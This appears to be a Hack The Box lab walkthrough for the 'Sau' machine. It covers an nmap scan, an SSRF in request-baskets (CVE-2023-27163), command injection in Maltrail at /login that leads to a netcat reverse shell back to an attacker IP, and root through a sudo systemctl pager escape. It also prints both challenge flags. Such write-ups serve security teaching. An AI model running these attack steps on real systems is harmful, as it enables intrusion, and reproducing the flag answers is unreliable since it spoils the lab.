
# HTB Walkthrough - Sau

**Machine:** Sau  
**Target IP:** 10.129.229.26

---

## Task 1 - Highest Open TCP Port

```bash
nmap -sV -sC -oA nmap/Sau 10.129.229.26
```

**Open Ports:**
- 22/tcp → OpenSSH 8.2p1
- 80/tcp → Filtered
- 55555/tcp → Golang net/http server

> **Answer:** 55555

---

## Task 2 - Name of Open Source Software on Port 55555

Accessing `http://10.129.229.26:55555/web/baskets` reveals:

> **Answer:** request-baskets

---

## Task 3 - Version of request-baskets

> **Answer:** 1.2.1

---

## Task 4 - CVE ID for SSRF in request-baskets v1.2.1

> **Answer:** CVE-2023-27163

---

## Task 5 - Software on Port 80 (via SSRF)

```bash
bash ./CVE-2023-27163.sh http://10.129.229.26:55555/ http://127.0.0.1:80/
```

Accessing `http://10.129.229.26:55555/<basket>` reveals:

> **Answer:** Maltrail

---

## Task 6 - Relative Path Vulnerable to Command Injection

Based on [EDB-51676](https://www.exploit-db.com/exploits/51676):

> **Answer:** /login

---

## Task 7 - System User Running Maltrail

Reverse shell using:

```bash
nc -nlvp 8888
python3 exploit.py 10.10.14.156 8888 http://10.129.229.26:55555/<basket>
```

> **Answer:** puma

---

## Submit User Flag

```bash
cat /home/puma/user.txt
```

> **Flag:** de1fe822eea8f84d4c69ca2429e78cff

---

## Task 9 - Binary puma Can Run as root

```bash
sudo -l
```

> **Answer:** /usr/bin/systemctl

---

## Task 10 - systemd Version

```bash
systemctl --version
```

> **Answer:** systemd 245 (245.4-4ubuntu3.22)

---

## Task 11 - CVE ID for Local Privilege Escalation in systemd

> **Answer:** CVE-2023-26604

---

## Submit Root Flag

```bash
sudo /usr/bin/systemctl status trail.service
!sh
id
cat /root/root.txt
```

> **Flag:** afc4350a2648b48b982367db13b5a9e3
